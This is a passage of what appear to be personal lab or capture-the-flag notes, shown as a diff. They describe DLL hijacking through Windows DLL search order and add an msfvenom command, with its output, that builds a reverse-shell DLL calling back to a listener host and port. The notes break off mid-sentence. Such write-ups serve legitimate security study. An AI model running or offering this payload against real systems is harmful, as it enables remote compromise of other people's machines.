@@ -559,4 +559,13 @@ So it may be possible to attempt DLL hijacking
 
 Because of DLL search order i can craft a malicious dll then place it in the same dir as the exe and it will pull from that malicious DLL
 
-
+# Malicious DLL creation
+```python
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.200.50.211 LPORT=1337 -f dll -o reverse.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: reverse.dll
+```
+This generated the payload but now im realising it 
